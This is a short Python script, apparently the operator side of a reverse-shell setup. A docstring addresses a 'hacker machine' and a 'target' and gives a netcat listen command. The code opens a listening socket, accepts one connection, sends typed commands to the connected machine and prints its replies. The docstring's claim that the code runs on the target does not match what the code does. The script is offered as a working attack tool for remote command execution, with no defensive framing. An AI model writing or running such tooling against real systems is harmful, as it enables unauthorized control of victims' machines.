#!/usr/bin/env python3
'''
Do this on hacker machine:

nc -vv -l -p 4444
netcat verbose listen port 4444


Run this code on the target:

'''
import argparse
import socket
import subprocess

def get_arg(parser, flag, name, text):
    parser.add_argument("-" + flag, "--" + name, dest=name, help=text)
    return parser

def get_my_ip():
    ip = subprocess.check_output("hostname -I", shell=True)
    ip = ip.decode("utf-8")
    return ip


def listen_to(port):
    # create a socket object
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # listener
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((get_my_ip().strip(), port))
    return listener

def send_str(connection, stringMessage):
    connection.send(("\n" + stringMessage).encode("utf-8"))
    return

def recv_str(connection, bufferSize):
    recv_data = connection.recv(bufferSize).decode("utf-8")
    return recv_data


parser = argparse.ArgumentParser()
parser = get_arg(parser, 'p', 'port', 'Port to listen to')
value = parser.parse_args()
port = value.port
listener = listen_to(int(port))
listener.listen()
print("[INFO] Waiting for connections at port " + str(port))
connection, address = listener.accept()
print("[INFO] Connected to " + str(address[0]) + " at port " + str(address[1]))
reply = recv_str(connection, 1024)
cmd = input(">> ")
while cmd.strip() != "close":
    print(reply.strip())
    send_str(connection, cmd)
    reply = recv_str(connection, 1024)
    cmd = input(">> ")
listener.close()




